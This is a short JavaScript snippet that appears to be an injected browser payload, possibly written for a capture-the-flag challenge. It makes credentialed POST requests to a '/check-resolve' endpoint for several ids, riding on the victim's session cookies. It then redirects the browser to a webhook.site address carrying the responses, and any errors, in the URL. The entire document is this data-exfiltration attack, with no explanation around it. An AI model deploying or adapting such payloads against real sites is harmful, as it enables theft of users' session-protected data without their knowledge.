(async()=>{
  try{
    const hook='https://webhook.site/aef63664-4b2b-4a25-a695-c21c1fdd7a89/';

    const ids=[7,8,9,10,11,12,13,14,15];

    const results=await Promise.all(ids.map(async(id)=>{
      const body=new URLSearchParams();
      body.append('id',String(id));

      const r=await fetch('/check-resolve',{
        method:'POST',
        headers:{'Content-Type':'application/x-www-form-urlencoded'},
        body,
        credentials:'include'
      });

      return {id,t:await r.text()};
    }));

    for(const x of results){
      if(!x.t.includes('"resolve":"Done"') && !x.t.includes('"resolve":"Not yet"')){
        location=hook+'?d='+encodeURIComponent('id='+x.id+' :: '+x.t);
        return;
      }
    }

    location=hook+'?d='+encodeURIComponent(
      results.map(x=>x.id+'='+x.t).join(' | ')
    );
  }catch(e){
    location='https://webhook.site/aef63664-4b2b-4a25-a695-c21c1fdd7a89/?err='+encodeURIComponent(e.toString());
  }
})();